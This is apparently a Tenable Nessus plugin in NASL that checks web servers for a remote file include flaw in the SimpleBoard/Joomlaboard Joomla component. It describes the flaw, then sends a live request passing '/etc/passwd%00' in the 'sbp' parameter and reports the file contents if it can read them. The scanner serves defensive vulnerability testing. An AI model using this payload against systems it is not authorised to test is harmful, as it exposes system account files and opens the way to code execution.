#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to
remote file include attacks. 

Description :

The remote host is running SimpleBoard or Joomlaboard, a web-based
bulletin board component for Mambo / Joomla. 

The version of Simpleboard / Joomlaboard installed on the remote host
fails to sanitize user-supplied input to the 'sbp' parameter of the
'file_upload.php' and 'image_upload.php' scripts before using it to
include PHP code.  Provided PHP's 'register_globals' setting is
enabled, an unauthenticated attacker may be able to exploit these
flaws to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://milw0rm.com/exploits/1994

Solution :

Disable PHP's 'register_globals' setting or upgrade to Joomlaboard
version 1.1.2 or later. 

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22023);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-3528");
  script_bugtraq_id(18917);
  script_xref(name:"OSVDB", value:"27421");
  script_xref(name:"OSVDB", value:"28531");

  script_name(english:"SimpleBoard / Joomlaboard sbp Parameter Remote File Include Vulnerabilities");
  script_summary(english:"Tries to read a local file using SimpleBoard / Joomlaboard");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
install = get_kb_item(string("www/", port, "/joomla"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}


# Loop through each directory.
foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  foreach com (make_list("com_simpleboard", "com_joomlaboard"))
  {
    req = http_get(
      item:string(
        dir, "/components/", com, "/image_upload.php?",
        "sbp=", file
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0/sb_helpers\.php.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = res - strstr(res, "<br");
      }

      if (contents)
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
      else report = desc;

      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
